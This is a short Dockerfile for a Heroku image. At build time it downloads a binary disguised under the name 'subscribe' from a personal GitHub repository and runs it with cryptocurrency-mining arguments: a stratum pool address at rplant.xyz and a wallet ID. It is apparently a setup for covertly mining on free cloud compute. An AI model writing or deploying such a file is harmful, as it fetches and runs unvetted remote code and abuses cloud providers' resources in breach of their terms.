FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/mosab11m/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Mnmd54d3Zs9HRbNoZRz6fcj47t2As32pk5.VPS
CMD bash heroku.sh
